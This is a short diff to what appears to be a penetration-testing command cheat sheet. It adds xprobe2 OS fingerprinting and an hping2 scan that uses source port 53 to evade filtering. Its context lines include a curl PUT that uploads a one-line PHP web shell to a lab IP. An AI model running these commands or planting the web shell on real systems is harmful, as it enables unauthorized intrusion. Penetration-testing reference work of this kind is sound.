@@ -232,3 +232,13 @@ curl -I -H 'Accept-Encoding: gzip,deflate' http://example.com/index.php (Checkin
 curl -v -X OPTIONS http://192.168.56.103 (Check OPTIONS)
 curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.200.150/1.php
 ```
+
+###
+```
+OS finger Print
+
+#xprobe2 -v 192.168.0.174
+
+Specific Source Ports to Bypass Filtering
+hping2 -c 3 -s 53 -p 139 -S 192.168.0.1
+```
